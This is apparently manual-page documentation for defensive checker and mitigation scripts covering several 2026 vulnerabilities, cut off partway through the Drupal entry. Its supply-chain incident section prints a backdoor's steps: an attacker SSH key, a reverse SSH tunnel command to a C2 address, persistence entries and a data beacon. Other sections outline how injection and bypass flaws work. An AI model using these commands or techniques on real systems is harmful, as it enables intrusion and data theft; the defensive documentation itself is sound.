@node psf-basercms-check
@section psf-basercms-check
baserCMS 5 admin SQL injection, path traversal and deserialization: read-only checker
@example
baserCMS 5 admin SQL injection, path traversal and deserialization: read-only checker  (v1)
CVE-2026-114621, CVE-2026-114622, CVE-2026-114624

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

baserCMS is a website development framework and CMS (PHP, CakePHP based). Its security
releases 5.3.2 and 5.4.2 of 23 October 2026 fix three flaws rated High:

  CVE-2026-114621  8.8 (v3.1)  SQL injection in the admin panel and the admin API. The list
                             and detail actions of the Admin and Api/Admin prefixes pass
                             request query parameters (contain, conditions, fields, finder,
                             order) straight to the ORM as options, so a logged-in user can
                             inject SQL and read data such as password hashes.
                             Affected: 5.0.0 before 5.3.2, and 5.4.0 before 5.4.2.
  CVE-2026-114622  7.2         Path traversal (CWE-22).
                             Affected: 5.2.3 before 5.3.2, and 5.4.0 before 5.4.2.
  CVE-2026-114624  7.2         Deserialization of untrusted data (CWE-502). An administrator,
                             or an attacker who gets widget-write capability through another
                             flaw such as chained XSS, can plant an object graph that fires on
                             unauthenticated page requests. Two gadget chains in the default
                             dependency set reach proc_open() and run commands as the web
                             server user. Affected: 5.0.0 before 5.3.2, and 5.4.0 before 5.4.2.

  Fixed: 5.3.2 and 5.4.2. Sites on 5.0 to 5.2 move to 5.3.2 or 5.4.2.

How this script reads a site. The version is the first line of
plugins/baser-core/VERSION.txt. Each flaw is judged on its own range. The script also reads
the two things the fix for CVE-2026-114621 adds: the removeOrmStructureFromRequest() method in
plugins/baser-core/src/Controller/AppController.php, and 'order' in the list of ORM
structure keys that plugins/baser-core/src/Service/BcQueryParameterTrait.php strips. Both
present means that fix is there, whatever the version string says; a fixed version whose
files lack it is a failed update; one of the two is a partial update. Those signatures
cover CVE-2026-114621 only, so the other two flaws are always judged by version.

No indicators of exploitation have been published for these flaws, so there is no hunt. This
script is read-only. A plain version file means a clean result cannot prove the site was not
attacked: after exposure, review administrator accounts and widgets, and rotate passwords.

Usage:
  ./basercms-check.sh [command] [DIR ...]

  check (default)  scan DIR (default /var/www /srv /opt /home) for baserCMS 5 sites. Exit 0 =
                   nothing exposed, 1 = an exposed or unverifiable site.
  version          print the script version.
Containers: with no directory argument the check also copies the files it reads from running
docker and podman containers (SCAN_CONTAINERS=1, the default; 0 skips them) and judges them like
host installs. The copies are temporary: a path shown as .../docker_NAME_PATH is the PATH inside
the container NAME.
@end example
The script is /opt/psf-security-patches/basercms/basercms-check.sh. Manual page: psf-basercms-check(8).
@node psf-bind-check
@section psf-bind-check
ISC BIND 9 GSS-TSIG memory corruption: read-only checker
@example
ISC BIND 9 GSS-TSIG memory corruption: read-only checker  (v1)
CVE-2026-94300

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

Replaying a GSS-TSIG signed UDP message can corrupt memory in named, the BIND 9
name server. ISC says that, combined with crafted queries to a zone the attacker
controls, it can lead to remote code execution, and at minimum it can crash
named. Rated High, CVSS 8.1 (the attack is complex: the attacker must capture a
signed message and replay it while the key is still valid). ISC knows of no
active exploitation and lists NO WORKAROUND.

  Affected: BIND 9.11.0 through 9.18.50, 9.20.0 through 9.20.29,
            9.21.0 through 9.21.26 (and matching -S1 Supported Preview builds)
  Fixed:    9.20.30 and 9.21.27 (9.20.30-S1 for the Preview Edition)
  Move to:   9.20. The 9.18 branch and everything older is end of life. Distributions that still
            support 9.18 may backport the fix: the script looks for that.

The code is present in every build, but the vulnerable path needs GSS-TSIG,
which is used for secure dynamic updates against Kerberos or Active Directory.
One analysis says builds without GSS-TSIG configured do not reach it; ISC's
advisory text does not spell out which configuration is required,
so the script reports whether GSS-TSIG is configured as a hint, never as proof
of safety, and tells you to update either way.

The same BIND releases fix three other denial of service flaws, which only the
update fixes.

This script is read-only. It finds named binaries (PATH, usual locations and
running processes), reads the version from "named -v", reads named.conf and its
include files, and looks for GSS-TSIG settings. It never reloads named.

Usage:
  ./bind-check.sh [command] [PATH-TO-named ...]

  check (default)  Exit 0 = nothing exposed, 1 = an affected version is exposed
                   or its configuration could not be read.
  version          print the script version.

Environment: NAMED_CONF (space separated files) replaces configuration discovery.
Containers: with no argument the check also looks in running docker and podman containers
(SCAN_CONTAINERS=1, the default; 0 skips them). A read-only probe captures the daemon's version
output and its configuration (secrets are redacted inside the container before anything is
copied) into a private temporary directory, and this script then runs once per container, in
isolation, against that copy. Paths shown as .../docker_NAME/... are inside the container NAME.
@end example
The script is /opt/psf-security-patches/bind/bind-check.sh. Manual page: psf-bind-check(8).
@node psf-brotli-oct2026-check
@section psf-brotli-oct2026-check
Brotli decoder out-of-bounds write, October 2026: read-only checker
@example
Brotli decoder out-of-bounds write, October 2026: read-only checker  (v1)
CVE-2026-111497

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

Known as Broccoli2Shell (first called Node2Shell). Google's Brotli decoder
(libbrotli / libbrotlidec, 1.0.3 through 1.2.0) can be handed a block switch
that cannot happen. DecodeBlockTypeAndLength() returned a plain boolean, so
the caller could not tell a malformed stream from one that needed more input,
and the fast path ignored the result. The decoder kept appending attacker
bytes to an eight-byte internal buffer, writing past its end: a crash, a
memory disclosure, or remote code execution (CWE-252 and CWE-787). The flaw
is in the upstream C library, and the same CVE has advisories across
everything that bundles it: Node.js, Bun, Envoy, Istio, the Python brotli and
brotlicffi bindings, the Ruby and PHP extensions, and OS packages. Some
people are calling the broadened picture "HTTP2Shell", since any HTTP path
that decodes untrusted Brotli can be a route to it.

Fixed upstream in Brotli 1.0.10, 1.1.1 and 1.2.1 (the decoder now returns
BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH, -17). Distributions backport the
fix into their own libbrotli builds, sometimes under an older version number.
A copy older than 1.0.3 is outside the advisory's affected range, but this
script still reports it as not fixed: it is unsupported, so it moves to 1.0.10,
1.1.1 or 1.2.1.

This is read-only: it finds what needs updating and judges each against the
fixes. It does NOT change anything. The fix is to update the library or the
runtime. There is no host-wide switch to turn Brotli off; disabling Brotli
decoding is application-specific (reject
Content-Encoding: br before it is decompressed, turn off automatic Brotli in
HTTP clients, disable the Brotli decompressor filter in Envoy/Istio). See
the repository README and https://patchtheplanet.org/brotli

For the Node.js guard (loading a require-hook that refuses to decode),
use node/node-oct2026-mitigate.sh and node/brotli-guard.cjs instead. This
script only reports Node's version.

Usage:
  ./brotli-oct2026-check.sh [command]

  check (default)  every libbrotli on the host, the running processes that
                   have libbrotlidec loaded (and any still running a library
                   that was replaced on disk), the runtimes that bundle their
                   own Brotli (Node.js, Bun, Python's brotli and brotlicffi,
                   the Ruby brotli gem, the PHP brotli extension, Envoy,
                   Istio, cdxgen), and libbrotli inside running containers,
                   with whether each carries the fix. It also lists other
                   software on PATH that bundles an unfixed copy (.NET,
                   DuckDB, ClickHouse); that list is informational. Root
                   optional. Exit 0 = nothing exposed, 1 = a vulnerable
                   Brotli is present, 2 = something couldn't be read.
  hunt             read-only: the journal and logs for process crashes that
                   look like a Brotli decoder overflow (segfaults with
                   brotli/BrotliDecoder frames, heap corruption aborts).
                   Exit 0 = clean, 1 = findings.
  version          print the script version.

Env overrides:
  FIXED_BUILDS="1.0.9-2+deb12u2 1.1.0-2ubuntu0.1"
                                    extra distro libbrotli builds known to
                                    carry the fix, space-separated full
                                    versions. Checked alongside a built-in
                                    list of known builds (Debian 13's
                                    1.1.0-2+deb13u1), which a value here does
                                    not replace.
  BRANCH_FIXED="1.0:1.0.10 1.1:1.1.1 1.2:1.2.1"
                                    first fixed upstream release per branch
  RUBY_BROTLI_FIXED="0.9.1"         first fixed Ruby brotli gem
  PHP_BROTLI_FIXED="0.21.1"         first fixed PHP brotli extension
  SCAN_CONTAINERS=1                 1 = read libbrotli inside running
                                    containers (default 1; 0 to skip)
  HUNT_SINCE="2026-10-01"           how far back hunt reads the journal
  HUNT_LOGS="/srv/app/log/*.log"    extra log globs for hunt
  NODE_FIXED="22.23.4 24.22.1 26.12.1"
                                    first fixed Node.js release per line
  BUN_FIXED=1.4.4                   first fixed Bun release
  PYBROTLICFFI_FIXED=1.2.1.0        first fixed pybrotlicffi release
  ENVOY_FIXED="1.40.0 1.39.3 1.38.6 1.37.8 1.36.12"
                                    first fixed Envoy release per line
  ISTIO_FIXED="1.29.9 1.30.6 1.31.2"  first fixed Istio release per line
  CDXGEN_FIXED="13.5.0 12.8.9"       first fixed cdxgen release per line
@end example
The script is /opt/psf-security-patches/brotli/brotli-oct2026-check.sh. Manual page: psf-brotli-oct2026-check(8).
@node psf-claude-code-vsx-oct2026-check
@section psf-claude-code-vsx-oct2026-check
Claude Code extension SSH backdoor (Cursor marketplace, 29 October 2026): check, hunt, update, keys, clean
@example
Claude Code extension SSH backdoor (Cursor marketplace, 29 October 2026): check, hunt, update, keys, clean  (v1)
No CVE (supply-chain compromise of an editor extension)

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

Cursor reports that between about 2:27am and 1:35pm Pacific time on 29 October
2026 a maliciously modified copy of the Claude Code extension for VS Code
(versions 2.1.312 and 2.1.313) was served from the Cursor extension
marketplace, to up to 5,000 developer machines. Anthropic says it was not
involved in building, publishing or hosting the tampered build. A prefix added
to extension.js runs the moment the editor loads the extension. It:
  - appends the attacker's ed25519 key (comment "svc-telemetry") to
    ~/.ssh/authorized_keys;
  - writes ~/.config/.smt (a retry loop) and ~/.config/.smtk (the tunnel key),
    and a copy of the tunnel key as .stk_<10 hex> in the temp directory;
  - opens a reverse SSH tunnel (ssh -N -R '*:0:localhost:22') to
    tunnel@@134.209.82.225 and retries it about every 60 seconds, kept alive
    across reboots by a LaunchAgent (~/Library/LaunchAgents/
    com.apple.sysmond.plist) on macOS or an @@reboot crontab entry on GNU/Linux
    (a scheduled task named SysMon on Windows);
  - tries to switch the local SSH server on (this fails without admin rights
    on most machines, so the inbound path is often closed, but the key and
    the persistence are still planted);
  - POSTs the hostname, user name, OS, public IP, git email and the NAMES of
    environment variables that look like secrets (not their values) to
    http://134.209.82.225:8099/beacon.
Cursor says it has had the attacker's server taken offline. Treat that as a
reason the damage may be smaller, not as a reason to skip the cleanup.

Updating or uninstalling the extension does NOT remove any of that. A
replacement build, 2.1.314, was published on 30 October; it swaps the
extension's files and leaves the key, the scripts and the persistence in
place. This script checks for each piece separately.

One detail matters when judging versions: a legitimate 2.1.312 exists (it is
on npm and Open VSX, published 27 October). Only the copy served by Cursor's
marketplace was modified. So 2.1.312 is judged by the content of its
extension.js, not by its number. 2.1.313 was never published legitimately
anywhere and is reported on sight.

Get the vendor's fix FIRST, then clean. Anthropic replaced the bad build with
Claude Code 2.1.314 (published 30 October 2026); 2.1.314 or newer is the fix. Every
run of check, hunt, clean and update says so up front. The "update" command below
installs it through your editor, but only after it shows you the state of the
machine and asks. Installing the fix is half of the job: it does not remove an
SSH key, implant files or persistence that already got planted.

Usage:
  ./claude-code-vsx-oct2026-check.sh [command] [options]

  check (default)  read-only. Looks for: an installed Claude Code extension
                   that is 2.1.313 or carries the backdoored extension.js
                   (known SHA-256, the C2 address or the svc-telemetry key
                   comment); a downloaded or cached extension package with a
                   known bad hash; the attacker's key in authorized_keys
                   (matched by key, by fingerprint and by comment), with an
                   inventory of every other key so an unknown one stands out;
                   the implant files; the crontab entry or LaunchAgent;
                   running tunnel processes; a connection to the C2; and
                   whether this machine's SSH server is reachable on the
                   loopback address, which is the door the tunnel opens.
                   Exit 0 = nothing found, 1 = exposure or compromise found,
                   2 = could not read what it needed to.
  hunt             read-only. Searches the SSH server logs for a login with
                   the attacker's key (a login through the tunnel arrives
                   from 127.0.0.1 or ::1), and lists recent changes under
                   ~/.ssh, ~/.config and the LaunchAgents folder for review.
                   Exit 0 = no login evidence, 1 = evidence found.
  update           the vendor's fix, with questions first. (1) a read-only check, as
                   above. (2) for each editor command line (code, cursor, codium,
                   windsurf) whose extensions folder holds Claude Code, it shows the
                   command it would run (<editor> --install-extension
                   anthropic.claude-code --force; the editor downloads the extension
                   from its own marketplace, this script downloads nothing) and asks
                   before running it. An editor that does not have the extension is
                   not offered one. (3) it checks again, says whether Claude Code
                   2.1.314 or newer is now installed, and, if the machine shows the
                   backdoor, asks whether to run 'clean' now. It needs a terminal to
                   ask on, or --yes (install without asking). --yes never answers the
                   clean question: that needs an answer at the terminal, or --and-clean. As root it checks and cleans but does not
                   install, because editors are per user. Close the editor first.
                   --dry-run shows the commands and runs none.
  keys             read-only. Lists the private keys in each account's ~/.ssh with
                   their type, fingerprint, last change and whether a passphrase
                   protects the file, and counts the agent sockets in ~/.ssh/agent.
                   It prints no key material. A private key file that no passphrase
                   protects can be used by anything that can read it, which is what
                   a file-reading flaw in an editor or assistant gets; keys loaded in
                   an ssh-agent are not in those files. OpenSSH 10.1 and later keep
                   the agent's socket in ~/.ssh/agent (older versions use /tmp):
                   that folder holds sockets, not keys, so there is nothing in it to
                   block. Exit 0, or 2 if something could not be read.
  clean            containment and cleanup. Stops the tunnel processes,
                   unloads and removes the persistence, removes the
                   attacker's key line from authorized_keys, and moves the
                   implant files and the bad extension folders into a
                   backup folder (nothing is deleted). Add --reinstall to
                   install the extension again through any editor command
                   line it finds (code, cursor, codium, windsurf). Close the
                   editor first. Re-checks afterwards and exits 1 if anything
                   remains. --dry-run shows what it would do. Before it changes anything
                   it keeps a record of each account's ~/.ssh in the backup folder:
                   authorized_keys, config and known_hosts with their times, an
                   inventory of the private keys (no key material), and the names of
                   the agent sockets. --copy-keys also copies the private key files
                   into the backup folder (0600), which is one more copy of a secret:
                   delete it once you have rotated the keys. --drop-agent-keys empties
                   the ssh-agents that belong to you (ssh-add -D) after the record is
                   kept; the keys must be added again afterwards. It is not a cure:
                   it does not help against key files that were already copied.
  block            GNU/Linux, as root: drop outbound traffic to the C2
                   address with nftables or iptables. Defense in depth only;
                   rules do not survive a reboot. On macOS it prints how to
                   do the same. --dry-run shows the command.
  unblock          remove the rule that block added.
  version          print the script version.

Options: --dry-run (clean, block, unblock, update)   --reinstall (clean)   --yes, --and-clean (update)
         --copy-keys, --drop-agent-keys (clean, and the clean step of update)

Run it as your own user to check your own account. Run it as root to check
every account on the machine. It works on GNU/Linux and macOS. It does not
cover Windows: use the remediation script in Cursor's notice there.

Env overrides:
  NO_NOTICE=1                       leave out the upfront notice about the vendor's fix
  ANSWERS_FILE=/path                answers for update, one per line (y or n), read
                                    instead of the terminal (for automation)
  HOMES="/home/a:/home/b"           accounts to check, colon separated (default:
                                    you; as root: every account)
  BACKUP_ROOT=/var/backups/claude-code-vsx-oct2026   where clean puts files
                                    (default for a normal user:
                                    ~/claude-code-vsx-oct2026-backup)
  TMP_DIRS="/tmp:/var/tmp"          where to look for .stk_ key copies (colon separated)
  EXT_ROOTS_EXTRA="/opt/ide/extensions"   more folders that hold extensions (colon separated)
  EXTRA_KEY_BLOBS, EXTRA_FPRS, EXTRA_SHA256   more indicators, space separated,
                                    for when the vendors publish updates
  HUNT_LOGS="/var/log/ssh/*.log"    extra log files for hunt
  HUNT_LOG_DAYS=4                   how many days of macOS log to search
  LOOPBACK_PORT=22                  port to probe on 127.0.0.1
  PLATFORM=Linux|Darwin             override the detected platform
@end example
The script is /opt/psf-security-patches/claude-code-vsx/claude-code-vsx-oct2026-check.sh. Manual page: psf-claude-code-vsx-oct2026-check(8).
@node psf-collabora-code-oct2026-mitigate
@section psf-collabora-code-oct2026-mitigate
Nextcloud Collabora Built-in CODE Server command injection: mitigation
@example
Nextcloud Collabora Built-in CODE Server command injection: mitigation  (v1)
CVE-2026-110447

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

The optional Nextcloud app "Collabora Online - Built-in CODE Server"
(package richdocumentscode) ships a proxy.php that the web server runs
directly, outside Nextcloud's code. Before 26.4.303 it built the command to
start the local CODE server by placing text from the request, including its
path, inside a double-quoted bash string, so a request with $(...) in its
path ran commands as the web server account, without logging in. It is
reachable only while the local CODE server is down (a restart, upgrade or
crash), which is when proxy.php tries to start it. The flaw has been
exploited in the wild since September 2026 to plant PHP web shells
(apps/richdocumentscode/shx*.php). Collabora is explicit that DISABLING the
app is not enough, because proxy.php is served whether or not the app is
enabled: it must be updated to >= 26.4.303 or removed. The fixed app needs
Nextcloud 30 or later; on Nextcloud 29 and older, upgrade Nextcloud or
remove the app. Standalone Collabora Online servers, and Nextcloud Office
(richdocuments) without the built-in app, are not affected. A separate
earlier command-injection fix in the same script does not close this one.

The real fix is to update richdocumentscode to >= 26.4.303 or remove it,
which this script does not do for you (an app-store update or removal, run
through Nextcloud's occ, is the administrator's call). What apply does is an
reversible mitigation: it neutralizes the exploited proxy.php on a
vulnerable install by replacing it with a stub that returns HTTP 403 and
builds no command, backing the original up first. That closes the exploited
path at once and disables the built-in CODE server until you update or
remove the app; restore puts the original back, and an app update replaces
the stub with the fixed proxy.php on its own.

Usage:
  ./collabora-code-oct2026-mitigate.sh [command]

  check (default)  find every Nextcloud with the built-in CODE app, report
                   the app version (fixed at 26.4.303), the Nextcloud version
                   (the fix needs 30+), and the proxy.php state. Read-only,
                   root optional. Exit 0 = nothing exposed, 1 = a vulnerable
                   app is present, 2 = something couldn't be read.
  apply            neutralize the exploited proxy.php on every vulnerable
                   install (backup first, idempotent, reversible). Needs
                   write access to the app, so run as root or the web user.
                   Refuses an already-fixed app unless --force.
  restore          put the original proxy.php back where apply replaced it.
  status           show which installs this script has mitigated.
  hunt             read-only: the app folders for planted web shells
                   (shx*.php and a known shell by hash) and the web server
                   access logs for the exploitation markers. Exit 0 = clean,
                   1 = findings, 2 = no app folder and no readable log, so
                   nothing was searched.
  version          print the script version.

Env overrides:
  NC_PATHS="/var/www /srv /opt"     where to look for Nextcloud installs
  RICHDOC_FIXED=26.4.303            first fixed app version
  NC_MIN_FOR_FIX=30                 Nextcloud major the fixed app requires
  BACKUP_ROOT=/var/backups/collabora-code-oct2026
  HUNT_SINCE="2026-09-01"           how far back hunt reads the journal
  HUNT_LOGS="/srv/app/log/*.log"    extra access-log globs for hunt
@end example
The script is /opt/psf-security-patches/nextcloud/collabora-code-oct2026-mitigate.sh. Manual page: psf-collabora-code-oct2026-mitigate(8).
@node psf-couchdb-check
@section psf-couchdb-check
Apache CouchDB admin-to-OS-command execution: read-only checker
@example
Apache CouchDB admin-to-OS-command execution: read-only checker  (v1)
CVE-2026-86471

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

An unvalidated runtime configuration value in Apache CouchDB lets a CouchDB
server admin run arbitrary shell commands as the operating system user that
runs CouchDB. CVSS 9.3 on the v4 scale. The attacker needs server-admin
credentials, so this is a privilege escalation from a CouchDB admin (a stolen
or weak admin password, an exposed admin interface, or a compromised
application that holds admin credentials) to the host. It is not a flaw an
anonymous visitor can use alone.

  Affected: Apache CouchDB 3.5.2 and earlier, on all platforms
  Fixed:    3.5.3

The same release fixes other CouchDB flaws, among them a pre-authentication
gzip decompression bomb on POST /_session. That one needs no credentials, which
is why it matters whether the node listens beyond localhost.

This script is read-only. It reads the CouchDB version from the release files
(releases/start_erl.data), the installed package, and, if you give it URLs, from
a single unauthenticated GET of the server's root document. It reads the ini
files for the bind address, require_valid_user and how many admin entries
exist. It NEVER prints a value from the [admins] section (they are password
hashes or passwords).

Usage:
  ./couchdb-check.sh [command] [URL ...]

  check (default)  Exit 0 = nothing affected, 1 = an affected version was found.
                   With URL arguments (such as http://10.0.0.5:5984/) it also
                   asks each server for its version. Without arguments it asks
                   only http://127.0.0.1:5984/ and ignores a refusal.
  version          print the script version.

Environment: COUCHDB_ROOT (default /opt/couchdb) and COUCHDB_ETC (space
separated, default "/opt/couchdb/etc /etc/couchdb /usr/local/etc/couchdb")
point the script at unusual layouts.
Containers: with no argument the check also looks in running docker and podman containers
(SCAN_CONTAINERS=1, the default; 0 skips them). A read-only probe captures the daemon's version
output and its configuration (secrets are redacted inside the container before anything is
copied) into a private temporary directory, and this script then runs once per container, in
isolation, against that copy. Paths shown as .../docker_NAME/... are inside the container NAME.
@end example
The script is /opt/psf-security-patches/couchdb/couchdb-check.sh. Manual page: psf-couchdb-check(8).
@node psf-craftcms-check
@section psf-craftcms-check
Craft CMS Twig create() blocklist bypass: read-only checker
@example
Craft CMS Twig create() blocklist bypass: read-only checker  (v1)
CVE-2026-112777 (GHSA-w643-x88w-6wcm)

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

Craft CMS restricts which classes the Twig create() function may instantiate
with a blocklist. The class-name checks are case-sensitive while PHP class
resolution is not, so a differently capitalized class name slips past the
blocklist. The result is remote code execution, or reading secrets such as
the .env file, for someone who can get Twig to render attacker-controlled
template content. CVSS 8.7 (v4.0), 7.2 (v3.1). It is an authenticated flaw:
it needs template-execution rights, so the realistic attackers are a
compromised or malicious control panel account, or any setup that lets
untrusted users supply template code. A GitHub proof of concept has been
reported by one CVE aggregator and is not linked here.

  Affected: Craft CMS 4.x from 4.0.0 before 4.18.8, and 5.x from 5.0.0 before 5.11.0
  Fixed:    4.18.8 and 5.11.0

The same two releases fix several related Twig sandbox and behavior-injection
flaws, so updating covers more than this one issue.

This script is read-only. It reads the Craft version from the installed
vendor/craftcms/cms (and from composer.lock), and from config/general.php it
reports whether allowAdminChanges is off and whether the Twig sandbox is on.

Usage:
  ./craftcms-check.sh [command] [DIR ...]

  check (default)  scan DIR (default /var/www /srv /home /opt) for Craft
                   projects. Exit 0 = nothing affected, 1 = an affected
                   version was found.
  version          print the script version.
Containers: with no directory argument the check also copies the files it reads from running
docker and podman containers (SCAN_CONTAINERS=1, the default; 0 skips them) and judges them like
host installs. The copies are temporary: a path shown as .../docker_NAME_PATH is the PATH inside
the container NAME.
@end example
The script is /opt/psf-security-patches/craft/craftcms-check.sh. Manual page: psf-craftcms-check(8).
@node psf-curl-oct2026-check
@section psf-curl-oct2026-check
curl HTTP/2 upload use-after-free, October 2026: read-only checker
@example
curl HTTP/2 upload use-after-free, October 2026: read-only checker  (v1)
CVE-2026-92392

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

A use-after-free in libcurl's HTTP/2 upload handling lets a malicious server
that receives an upload corrupt the client's memory, and the reporter turned
it into code execution on the uploading machine. The attack runs from the
server side: the client uploads roughly 135KB over HTTP/2 to an attacker's
HTTPS server (certificate must validate), the server stalls and resets the
stream, and curl reuses a freed handle. Taking over a client needs exact
knowledge of its build and heap, so curl expects most attempts to end in a
crash and rates the flaw High, not Critical. Because libcurl is linked by
many other programs, the exposure is not limited to the curl command.

Affected: curl and libcurl 8.12.0 through 8.22.0. Not present before 8.12.0.
Fixed upstream in 8.23.0, with branch backports 8.14.3, 8.16.2 and 8.20.2.
Distributions backport the fix into their own builds under older numbers
(Debian 13 trixie: 8.14.1-2+deb13u7, DSA-6558-1; Debian 12 is not affected).

This is read-only: it finds what needs updating and judges each against the
fixes. It changes nothing. The fix is to update curl/libcurl and restart the
programs that use it. Where you cannot update, curl's advice is to
avoid HTTP/2: the command's --http1.1 option, or CURLOPT_HTTP_VERSION set to
CURL_HTTP_VERSION_1_1 in an application (a request, since an existing
connection may be reused). A libcurl built without HTTP/2 cannot reach the
path at all.

Usage:
  ./curl-oct2026-check.sh [command]

  check (default)  every curl command and libcurl on the host, and libcurl
                   inside running containers, with whether each carries the
                   fix and whether the build supports HTTP/2. Root optional.
                   Exit 0 = nothing exposed, 1 = a vulnerable curl/libcurl is
                   present, 2 = something couldn't be read.
  hunt             read-only: the journal and logs for process crashes that
                   look like this bug: curl segfaults, use-after-free aborts,
                   programs killed by a crash signal. A failed attack is most
                   likely a crash, so a crash on an outbound HTTP/2 upload is
                   the signal. Exit 0 = clean, 1 = findings.
  version          print the script version.

Env overrides:
  FIXED_BUILDS="8.14.1-2+deb13u7 8.5.0-2ubuntu10.6"
                                    extra distro curl/libcurl builds known to
                                    carry the fix, space-separated full
                                    versions. Checked alongside a built-in
                                    list (Debian 13's 8.14.1-2+deb13u7),
                                    which a value here does not replace.
  CURL_SEGMENTS="8.12.0:8.14.3 8.15.0:8.16.2 8.17.0:8.20.2 8.21.0:8.23.0"
                                    "<introduced>:<fixed>" per maintained
                                    branch; the fix for a version is the one
                                    whose introduced bound is highest at or
                                    below it
  CURL_INTRODUCED=8.12.0            below this the flaw is not present
  SCAN_CONTAINERS=1                 1 = read libcurl inside running containers
                                    (default 1; 0 to skip)
  HUNT_SINCE="2026-10-01"           how far back hunt reads the journal
  HUNT_LOGS="/srv/app/log/*.log"    extra log globs for hunt
@end example
The script is /opt/psf-security-patches/curl/curl-oct2026-check.sh. Manual page: psf-curl-oct2026-check(8).
@node psf-drf-check
@section psf-drf-check
Django REST framework October 2026: checker with mitigation
@example
Django REST framework October 2026: checker with mitigation  (v1)
CVE-2026-114138 (Accept header CPU exhaustion)
CVE-2026-114137 (TokenProxy.delete() revokes nothing)

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

Django REST framework (DRF) is the standard toolkit for building web APIs on
Django. Both flaws are fixed in DRF 3.18.2.

CVE-2026-114138  DefaultContentNegotiation accepts an unbounded number and size
                 of Accept header tokens, and parses each one repeatedly for
                 every renderer. A remote, unauthenticated client can send many
                 distinct media types with large quoted parameters and burn
                 about 19 seconds of CPU per request. Every API view does
                 content negotiation, so any reachable endpoint is a target.
                 CVSS 7.5. Affected: every release before 3.18.2 (the 0.x and
                 2.x lines are not fixed upstream). The cost also involves
                 Django's own header parameter parser, which Django fixed
                 separately in 5.2.18, 6.0.9 and 6.1.2, so keep Django current
                 as well.

CVE-2026-114137  From 3.12.0 until 3.18.2, TokenProxy.delete() in
                 rest_framework.authtoken uses the wrong primary key, so the
                 delete matches no row and reports success. The token keeps
                 working. DRF tokens do not expire, so code that revokes access
                 through a TokenProxy instance leaves the access open
                 indefinitely. CVSS 7.4. Only sites with rest_framework.authtoken
                 installed are exposed, and DRF's own admin delete is not
                 affected. Revocation done with Token.objects (not TokenProxy)
                 works on every version.

"check" is read-only; "mitigate" and "rollback" are the only commands that change
anything. "check" finds installed copies (dist-info and egg-info
metadata) and declared pins (requirements, poetry.lock, uv.lock, pdm.lock,
Pipfile.lock), notes where rest_framework.authtoken and TokenProxy appear in
project source, and for installed copies compares the neighbouring Django.

Usage:
  ./drf-check.sh [command] [DIR ...]

  check (default)  scan DIR (default /usr/lib /usr/local/lib /opt /srv /var/www
                   /var/lib /home /root). Exit 0 = nothing affected, 1 = an
                   affected copy or pin was found.
  mitigate [options]   (root) changes the host. PrivacySafe protection: real Accept headers are far shorter than 1 KB, so
                   nginx answers 406 to an Accept header of 1024 characters or more,
                   which bounds the cost of the attack. Only when an affected copy is
                   found (--force overrides). Adds a map block right after "http @{" and
                   an include as the first line of every server block that proxies
                   (proxy_pass, uwsgi_pass or scgi_pass), then checks with nginx -t; if
                   nginx rejects the result everything is undone at once. nginx only.
                     --server-name NAME  only the server block that lists NAME (repeat)
                     --dir DIR           where to look for Django REST framework (repeat)
                     --dry-run           show the changes, change nothing
                     --reload            graceful reload afterwards (systemd)
                     --force             apply even if no affected copy is found
  rollback [--dry-run] [--reload]   remove what mitigate added and restore the files it edited.
  version          print the script version.
Containers: with no directory argument the check also reads the project files it needs from
running docker and podman containers (SCAN_CONTAINERS=1, the default; 0 skips them), through a
read-only probe, and judges them like host projects. The copies are temporary: a path shown as
.../docker_NAME/PATH is the PATH inside the container NAME.
@end example
The script is /opt/psf-security-patches/django/drf-check.sh. Manual page: psf-drf-check(8).
@node psf-drupal-core-check
@section psf-drupal-core-check
Drupal core Field UI and Entity List remote code execution: checker with mitigation
@example
Drupal core Field UI and Entity List remote code execution: checker with mitigation  (v2)
CVE-2026-108097 (SA-CORE-2026-014) and CVE-2026-108099 (SA-CONTRIB-2026-218)

If this software is helpful, consider a donation to our 501c3 nonprofit:
https://privacysafe.foundation

The Field UI module in Drupal core does not properly validate PHP callbacks
while it renders its tables. Drupal rates it Critical, 19/25. Drupal core
alone is not directly exploitable: the callbacks have to be reachable from
data an attacker controls, and that happens through contributed modules or
custom code. At least one such path needs no authentication, which is why the
Drupal Security Team announced it in advance (PSA-2026-10-12) and called for
emergency patching. A research write-up with laboratory artifacts has been
published; at disclosure no public exploit for real sites existed.

  Affected: Drupal core 8.9.0 up to 10.6.19, 11.0.0 up to 11.3.19,
            11.4.0 up to 11.4.10, and Drupal 12 before 12.0.0-beta2
  Fixed:    10.6.19, 11.3.19, 11.4.10 (released 14 October 2026), and
            12.0.0-beta2 for Drupal 12
  Move to:  a supported branch. 10.5.x and earlier, 11.2.x and earlier, 9.x and
            8.9.x are end of life
  Workaround published by Drupal: uninstall the core Field UI module. It covers
            only this advisory. The same release fixes two other core issues
            that only the update fixes.

CVE-2026-108099 is the same story for the contributed Entity List module
(project entity_list), which builds lists of entities without Views. Versions
before 3.0.10 have a critical remote code execution flaw (Drupal rating 19/25).
It is not directly exploitable by itself, but multiple serious exploit paths exist
with other contributed modules, at least one needs no authentication, and custom
code may expose it. Fixed: Entity List 3.0.10 (14 October 2026). UPDATING DRUPAL
CORE DOES NOT REPLACE THE MODULE: it needs its own update. The script checks it on
every site it finds, whatever the core version is.

"check" is read-only; "mitigate" and "rollback" are the only commands that change
anything. "check" finds Drupal sites from core/lib/Drupal.php (and
composer.lock), applies the version rules, reads exported configuration
(core.extension.yml) to see whether Field UI is enabled, and flags the
contributed Entity List module and compares its version with 3.0.10 (read from
its info.yml, or from composer.lock when the info file carries no version).

Usage:
  ./drupal-core-check.sh [command] [DIR ...]

  check (default)  scan DIR (default /var/www /srv /opt /home). Exit 0 = nothing
                   exposed, 1 = an affected site is exposed, unverifiable, or on
                   an end-of-life branch that cannot be patched.
  mitigate [--dir DIR] [--dry-run] [--force]   (root) changes the host. Drupal's own
